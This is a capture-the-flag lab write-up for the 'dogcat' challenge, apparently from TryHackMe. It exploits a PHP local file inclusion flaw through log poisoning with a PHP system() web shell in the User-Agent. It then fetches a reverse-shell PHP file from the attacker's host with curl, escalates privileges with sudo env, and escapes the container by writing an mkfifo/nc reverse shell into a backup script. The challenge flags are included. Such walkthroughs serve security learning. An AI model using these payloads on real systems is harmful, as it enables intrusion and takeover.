Difficult: Medium
------------------------------------
Note: +I made a website where you can look at pictures of dogs and/or cats! 
      +Exploit a PHP application via LFI and break out of a docker container.
------------------------------------
LFI: Local File Inclusion 
+ Scan the ports:
```bash
	nmap -sV -vv -A -T4 -p- <IP> 
	PORT   STATE SERVICE REASON         VERSION
	22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
	| ssh-hostkey: 
	|   2048 24:31:19:2a:b1:97:1a:04:4e:2c:36:ac:84:0a:75:87 (RSA)
	| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCeKBugyQF6HXEU3mbcoDHQrassdoNtJToZ9jaNj4Sj9MrWISOmr0qkxNx2sHPxz89dR0ilnjCyT3YgcI5rtcwGT9RtSwlxcol5KuDveQGO8iYDgC/tjYYC9kefS1ymnbm0I4foYZh9S+erXAaXMO2Iac6nYk8jtkS2hg+vAx+7+5i4fiaLovQSYLd1R2Mu0DLnUIP7jJ1645aqYMnXxp/bi30SpJCchHeMx7zsBJpAMfpY9SYyz4jcgCGhEygvZ0jWJ+qx76/kaujl4IMZXarWAqchYufg57Hqb7KJE216q4MUUSHou1TPhJjVqk92a9rMUU2VZHJhERfMxFHVwn3H
	|   256 21:3d:46:18:93:aa:f9:e7:c9:b5:4c:0f:16:0b:71:e1 (ECDSA)
	| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBouHlbsFayrqWaldHlTkZkkyVCu3jXPO1lT3oWtx/6dINbYBv0MTdTAMgXKtg6M/CVQGfjQqFS2l2wwj/4rT0s=
	|   256 c1:fb:7d:73:2b:57:4a:8b:dc:d7:6f:49:bb:3b:d0:20 (ED25519)
	|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIfp73VYZTWg6dtrDGS/d5NoJjoc4q0Fi0Gsg3Dl+M3I
	80/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.38 ((Debian))
	|_http-title: dogcat
	| http-methods: 
	|_  Supported Methods: GET HEAD POST OPTIONS
	|_http-server-header: Apache/2.4.38 (Debian)
```

+ Enumurate the directories:
```bash
	gobuster dir -u http://<IP>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -xtxt,php,html -t64
	===============================================================
	Gobuster v3.6
	by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
	===============================================================
	[+] Url:                     http://<IP>/
	[+] Method:                  GET
	[+] Threads:                 64
	[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
	[+] Negative Status codes:   404
	[+] User Agent:              gobuster/3.6
	[+] Extensions:              txt,php,html
	[+] Timeout:                 10s
	===============================================================
	Starting gobuster in directory enumeration mode
	===============================================================
	/index.php            (Status: 200) [Size: 418]
	/cat.php              (Status: 200) [Size: 26]
	/flag.php             (Status: 200) [Size: 0]
	/cats                 (Status: 301) [Size: 311] [--> http://10.10.13.109/cats/]
	/dogs                 (Status: 301) [Size: 311] [--> http://10.10.13.109/dogs/]
	/dog.php              (Status: 200) [Size: 26]
	/server-status        (Status: 403) [Size: 277]
	Progress: (99.98%)
	===============================================================
	Finished
	===============================================================

```



+ IP/?view=dogs or /?view=cats

-Warning: include(dogs.php): failed to open stream: No such file or directory in /var/www/html/index.php on line 24

-Warning: include(): Failed opening 'dogs.php' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/index.php on line 24

```bash
	curl http://<IP>/index.php?view=cat.php
	<b>Warning</b>:  include(cat.php.php): failed to open stream: No such file or directory in <b>/var/www/html/index.php</b> on line <b>24</b><br />
	<br />
	<b>Warning</b>:  include(): Failed opening 'cat.php.php' for inclusion (include_path='.:/usr/local/lib/php') in <b>/var/www/html/index.php</b> on line <b>24</b><br />

```
--> Automation append .php in the last strings.

 + We will find LFI by using wrappers:
 - Wrapper php://filter: -Link: "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion"
 - In the "resource" we can try "index.php", "cat.php", "cat/../../index" and finally the correct is "cat/../index", we don't need the .php because the page will auto append .php in the last. 
 - In this page, we can use the base64-encode to convert the output.
 ```bash
	"curl http://<IP>/index.php?view=php://filter/convert.base64-encode/resource=cat/../index"
	<!DOCTYPE HTML>
<html>

<head>
    <title>dogcat</title>
    <link rel="stylesheet" type="text/css" href="/style.css">
</head>

<body>
    <h1>dogcat</h1>
    <i>a gallery of various dogs or cats</i>

    <div>
        <h2>What would you like to see?</h2>
        <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
        Here you go!PCFET0NUWVBFIEhUTUw+CjxodG1sPgoKPGhlYWQ+CiAgICA8dGl0bGU+ZG9nY2F0PC90aXRsZT4KICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgdHlwZT0idGV4dC9jc3MiIGhyZWY9Ii9zdHlsZS5jc3MiPgo8L2hlYWQ+Cgo8Ym9keT4KICAgIDxoMT5kb2djYXQ8L2gxPgogICAgPGk+YSBnYWxsZXJ5IG9mIHZhcmlvdXMgZG9ncyBvciBjYXRzPC9pPgoKICAgIDxkaXY+CiAgICAgICAgPGgyPldoYXQgd291bGQgeW91IGxpa2UgdG8gc2VlPzwvaDI+CiAgICAgICAgPGEgaHJlZj0iLz92aWV3PWRvZyI+PGJ1dHRvbiBpZD0iZG9nIj5BIGRvZzwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iLz92aWV3PWNhdCI+PGJ1dHRvbiBpZD0iY2F0Ij5BIGNhdDwvYnV0dG9uPjwvYT48YnI+CiAgICAgICAgPD9waHAKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICAkZXh0ID0gaXNzZXQoJF9HRVRbImV4dCJdKSA/ICRfR0VUWyJleHQiXSA6ICcucGhwJzsKICAgICAgICAgICAgaWYoaXNzZXQoJF9HRVRbJ3ZpZXcnXSkpIHsKICAgICAgICAgICAgICAgIGlmKGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICdkb2cnKSB8fCBjb250YWluc1N0cigkX0dFVFsndmlldyddLCAnY2F0JykpIHsKICAgICAgICAgICAgICAgICAgICBlY2hvICdIZXJlIHlvdSBnbyEnOwogICAgICAgICAgICAgICAgICAgIGluY2x1ZGUgJF9HRVRbJ3ZpZXcnXSAuICRleHQ7CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgIGVjaG8gJ1NvcnJ5LCBvbmx5IGRvZ3Mgb3IgY2F0cyBhcmUgYWxsb3dlZC4nOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgPz4KICAgIDwvZGl2Pgo8L2JvZHk+Cgo8L2h0bWw+Cg==    </div>
</body>

</html>
 ``` 
-> The page encode base64 and we can decode to see.
```
<!DOCTYPE HTML>
<html>

<head>
    <title>dogcat</title>
    <link rel="stylesheet" type="text/css" href="/style.css">
</head>

<body>
    <h1>dogcat</h1>
    <i>a gallery of various dogs or cats</i>

    <div>
        <h2>What would you like to see?</h2>
        <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
        <?php
            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
	    $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
            if(isset($_GET['view'])) {
                if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
                    echo 'Here you go!';
                    include $_GET['view'] . $ext;
                } else {
                    echo 'Sorry, only dogs or cats are allowed.';
                }
            }
        ?>
    </div>
</body>

</html>

```

+ We know we can add extension "ext" replace .php
+ We try path /etc/passwd with "ext"
```bash
	http://<IP>/index.php?view=cat/../../../../../etc/passwd&ext
	Here you go!root:x:0:0:root:/root:/bin/bash
	daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
	bin:x:2:2:bin:/bin:/usr/sbin/nologin
	sys:x:3:3:sys:/dev:/usr/sbin/nologin
	sync:x:4:65534:sync:/bin:/bin/sync
	games:x:5:60:games:/usr/games:/usr/sbin/nologin
	man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
	lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
	mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
	news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
	uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
	proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
	www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
	backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
	list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
	irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
	gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
	nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
	_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
``` 

+ Now we will LFI to RCE via controlled log file.
+ Link: "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#lfi-to-rce-via-controlled-log-file"
+ After scan the ports, we know the port 80 use server Apache and we will try Apache and Apache2. We find port 80 use Apache2.
+ Access log file in Apache2.
```bash
http://<IP>/index.php?view=cat/../../../../../var/log/apache2/access.log&ext
Here you go!127.0.0.1 - - [09/Sep/2024:11:32:24 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [09/Sep/2024:11:32:54 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [09/Sep/2024:11:33:24 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [09/Sep/2024:11:33:54 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
10.11.101.46 - - [09/Sep/2024:11:33:55 +0000] "GET / HTTP/1.1" 200 537 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
10.11.101.46 - - [09/Sep/2024:11:33:55 +0000] "GET /style.css HTTP/1.1" 200 698 "http://10.10.117.90/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
10.11.101.46 - - [09/Sep/2024:11:33:56 +0000] "GET /favicon.ico HTTP/1.1" 404 490 "http://10.10.117.90/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
10.11.101.46 - - [09/Sep/2024:11:33:57 +0000] "GET /?view=dog HTTP/1.1" 200 563 "http://10.10.117.90/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
10.11.101.46 - - [09/Sep/2024:11:33:57 +0000] "GET /dogs/7.jpg HTTP/1.1" 200 30212 "http://10.10.117.90/?view=dog" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
10.11.101.46 - - [09/Sep/2024:11:33:59 +0000] "GET /?view=dog HTTP/1.1" 200 562 "http://10.10.117.90/?view=dog" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
10.11.101.46 - - [09/Sep/2024:11:34:00 +0000] "GET /dogs/1.jpg HTTP/1.1" 200 26513 "http://10.10.117.90/?view=dog" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
10.11.101.46 - - [09/Sep/2024:11:34:00 +0000] "GET /?view=cat HTTP/1.1" 200 564 "http://10.10.117.90/?view=dog" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
10.11.101.46 - - [09/Sep/2024:11:34:00 +0000] "GET /cats/10.jpg HTTP/1.1" 200 54573 "http://10.10.117.90/?view=cat" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
10.11.101.46 - - [09/Sep/2024:11:34:02 +0000] "GET /?view=cat HTTP/1.1" 200 563 "http://10.10.117.90/?view=cat" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
10.11.101.46 - - [09/Sep/2024:11:34:02 +0000] "GET /cats/6.jpg HTTP/1.1" 200 40540 "http://10.10.117.90/?view=cat" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
10.11.101.46 - - [09/Sep/2024:11:34:03 +0000] "GET /?view=dog HTTP/1.1" 200 562 "http://10.10.117.90/?view=cat" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
127.0.0.1 - - [09/Sep/2024:11:34:25 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [09/Sep/2024:11:34:55 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [09/Sep/2024:11:35:25 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
10.11.101.46 - - [09/Sep/2024:11:35:41 +0000] "GET /index.php?view=php://filter/convert.base64-encode/resource=cat/../index HTTP/1.1" 200 1908 "-" "curl/8.5.0"
127.0.0.1 - - [09/Sep/2024:11:35:55 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
10.11.101.46 - - [09/Sep/2024:11:36:14 +0000] "GET /index.php?view=cat/../../../../../etc/passwd HTTP/1.1" 200 998 "-" "curl/8.5.0"
127.0.0.1 - - [09/Sep/2024:11:36:25 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
10.11.101.46 - - [09/Sep/2024:11:36:27 +0000] "GET /index.php?view=cat/../../../../../etc/passwd HTTP/1.1" 200 706 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
10.11.101.46 - - [09/Sep/2024:11:36:34 +0000] "GET /index.php?view=cat/../../../../../etc/passwd HTTP/1.1" 200 998 "-" "curl/8.5.0"
10.11.101.46 - - [09/Sep/2024:11:36:51 +0000] "GET /index.php?view=cat/../../../../../etc/passwd&etc HTTP/1.1" 200 706 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
127.0.0.1 - - [09/Sep/2024:11:36:56 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
10.11.101.46 - - [09/Sep/2024:11:37:14 +0000] "GET /index.php?view=cat/../../../../../etc/passwd HTTP/1.1" 200 998 "-" "curl/8.5.0"
127.0.0.1 - - [09/Sep/2024:11:37:26 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
10.11.101.46 - - [09/Sep/2024:11:37:45 +0000] "GET /index.php?view=cat/../../../../../etc/passwd&ext HTTP/1.1" 200 883 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
127.0.0.1 - - [09/Sep/2024:11:37:56 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [09/Sep/2024:11:38:26 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
10.11.101.46 - - [09/Sep/2024:11:38:37 +0000] "-" 408 0 "-" "-"
127.0.0.1 - - [09/Sep/2024:11:38:57 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [09/Sep/2024:11:39:27 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [09/Sep/2024:11:39:57 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [09/Sep/2024:11:40:27 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"

```

+ After LFI to RCE via controlled log file, now we can RCE via Apache logs.
+ Link: "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#rce-via-apache-logs"
+ First we poison the "User-Agent" in access logs:
```bash
  ~# curl http://<IP>/ -A "<?php system(\$_GET['cmd']);?>"
	<!DOCTYPE HTML>
	<html>

	<head>
	    <title>dogcat</title>
	    <link rel="stylesheet" type="text/css" href="/style.css">
	</head>

	<body>
	    <h1>dogcat</h1>
	    <i>a gallery of various dogs or cats</i>

	    <div>
	        <h2>What would you like to see?</h2>
	        <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
	            </div>
	</body>

	</html>

```
+ Then request the logs via the LFI and execute your command:
```bash
view-source:http://<IP>/index.php?view=cat/../../../../../var/log/apache2/access.log&ext&cmd=id
	10.11.101.46 - - [09/Sep/2024:11:40:44 +0000] "GET /index.php?view=cat/../../../../../var/log/apache2/access.log&ext HTTP/1.1" 200 1115 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
	127.0.0.1 - - [09/Sep/2024:11:40:58 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
	127.0.0.1 - - [09/Sep/2024:11:41:28 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
	127.0.0.1 - - [09/Sep/2024:11:41:58 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
	127.0.0.1 - - [09/Sep/2024:11:42:28 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
	127.0.0.1 - - [09/Sep/2024:11:42:58 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
	127.0.0.1 - - [09/Sep/2024:11:43:29 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
	127.0.0.1 - - [09/Sep/2024:11:43:59 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
	10.11.101.46 - - [09/Sep/2024:11:48:17 +0000] "GET /index.php?view=cat/../../../../../var/log/apache2/access.log&ext&cmd=id HTTP/1.1" 200 1214 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
	127.0.0.1 - - [09/Sep/2024:11:48:31 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
	127.0.0.1 - - [09/Sep/2024:11:49:01 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
	10.11.101.46 - - [09/Sep/2024:11:49:09 +0000] "-" 408 0 "-" "-"
	127.0.0.1 - - [09/Sep/2024:11:49:31 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
	127.0.0.1 - - [09/Sep/2024:11:50:02 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
	10.11.101.46 - - [09/Sep/2024:11:50:05 +0000] "GET / HTTP/1.1" 200 615 "-" "uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

+ We can find some flags via command in the url:
```bash
	10.10.117.90/index.php?view=cat/../../../../../var/log/apache2/access.log&ext&cmd=ls
	10.11.101.46 - - [09/Sep/2024:11:50:05 +0000] "GET / HTTP/1.1" 200 615 "-" "cat.php
	cats
	dog.php
	dogs
	flag.php
	index.php
	style.css
	"
```

+ "FLAG1:
```bash
	10.10.117.90/index.php?view=cat/../../../../../var/log/apache2/access.log&ext&cmd=cat%20flag.php
	10.11.101.46 - - [09/Sep/2024:11:50:05 +0000] "GET / HTTP/1.1" 200 615 "-" "<?php
	$flag_1 = "THM{Th1s_1s_N0t_4_Catdog_ab67edfa}"
	?>
	"
```

+ FLAG2:
```bash
	10.10.117.90/index.php?view=cat/../../../../../var/log/apache2/access.log&ext&cmd=cat%20/var/www/flag2_QMW7JvaY2LvK.txt
	10.11.101.46 - - [09/Sep/2024:11:50:05 +0000] "GET / HTTP/1.1" 200 615 "-" "THM{LF1_t0_RC3_aec3fb}
	"
```

+ FLAG3:
 + Firs, we use "sudo -l" in cmd and we get ouput:
```bash
 10.11.101.46 - - [09/Sep/2024:11:50:05 +0000] "GET / HTTP/1.1" 200 615 "-" "Matching Defaults entries for www-data on 42905e333fcc:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on 42905e333fcc:
    (root) NOPASSWD: /usr/bin/env
"'
```

+ We run " sudo /usr/bin/env /bin/sh" to priv but we can get the root.
+ Problem: After try command 'cd, wget' in cmd, we can not get respone from server because some command is filtered in cmd by server.
           We can not run reverse shell command in cmd.
+ we can put revershell.php into the server by curl.
+ Try curl -h in cmd:
	"10.11.101.46 - - [09/Sep/2024:11:50:05 +0000] "GET / HTTP/1.1" 200 615 "-" "Usage: curl [options...] <url>
	     --abstract-unix-socket <path> Connect via abstract Unix domain socket
	     --anyauth       Pick any authentication method
	 -a, --append        Append to target file when uploading
	     --basic         Use HTTP Basic Authentication
	     --cacert <file> CA certificate to verify peer against
	     --capath <dir>  CA directory to verify peer against
	 -E, --cert <certificate[:password]> Client certificate file and password
	     --cert-status   Verify the status of the server certificate
	     --cert-type <type> Certificate file type (DER/PEM/ENG)
	     --ciphers <list of ciphers> SSL ciphers to use
	     --compressed    Request compressed response
	     --compressed-ssh Enable SSH compression
	 -K, --config <file> Read config from a file
	     --connect-timeout <seconds> Maximum time allowed for connection
	     --connect-to <HOST1:PORT1:HOST2:PORT2> Connect to host "
-> It works !!!

+ So we run 'curl' to put the revershell.php into the server.
+ Run "http://10.10.117.90/index.php?view=cat/../../../../../var/log/apache2/access.log&ext&cmd=curl http://10.11.101.46/Documents/revershell.php -o revershell.php"
+ When we open local server by 'python3 -m http.server':
	Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
	10.10.117.90 - - [09/Sep/2024 20:14:20] "GET /Documents/revershell.php HTTP/1.1" 200 -

+ Check in server:
	10.11.101.46 - - [09/Sep/2024:11:50:05 +0000] "GET / HTTP/1.1" 200 615 "-" "cat.php
	cats
	dog.php
	dogs
	flag.php
	index.php
	revershell.php
	style.css
	"
+ Now run the revershell.php to nc listner:
	"<IP>/revershell.php"
	---------------------
	```bash
	 nc -lvnp 1234
	Listening on 0.0.0.0 1234
	Connection received on 10.10.117.90 54720
	Linux 42905e333fcc 4.15.0-96-generic #97-Ubuntu SMP Wed Apr 1 03:25:46 UTC 2020 x86_64 GNU/Linux
	 13:18:55 up  1:47,  0 users,  load average: 0.00, 0.00, 0.00
	USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
	uid=33(www-data) gid=33(www-data) groups=33(www-data)
	sh: 0: can't access tty; job control turned off
	$ whoami
	www-data
	```
-> Success !!!

```bash
	$ sudo -l
	Matching Defaults entries for www-data on 42905e333fcc:
	    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

	User www-data may run the following commands on 42905e333fcc:
	    (root) NOPASSWD: /usr/bin/env
	$ sudo /usr/bin/env /bin/sh
	id
	uid=0(root) gid=0(root) groups=0(root)
	whoami
	root
	cd /root
	ls
	flag3.txt
	cat flag3.txt
	THM{D1ff3r3nt_3nv1ronments_874112}
```

+ FLAG4:
 - We know where is "docker env" so we can find something in /opt
 - We got the folder /backups
 - That have 2 file backup.sh and backup.tar 
```bash 
	cat backup.sh
	#!/bin/bash
	tar cf /root/container/backups/backup.tar /root/container
```
 - So we echo the script shell into the backup.sh:
 ```bash
 echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> 4444 > /tmp/f" > backup.sh
 chmod 777 backup.sh 
```
 - Now we run nc port and automate capture the listener:
 ```bash
	$ nc -lvnp 4444
	Listening on 0.0.0.0 4444
	Connection received on 10.10.117.90 46262
	/bin/sh: 0: can't access tty; job control turned off
	# id
	uid=0(root) gid=0(root) groups=0(root)
	# ls
	container
	flag4.txt
	# cat flag4.txt
	THM{esc4l4tions_on_esc4l4tions_on_esc4l4tions_7a52b17dba6ebb0dc38bc1049bcba02d}
 ```

END~~~!!!


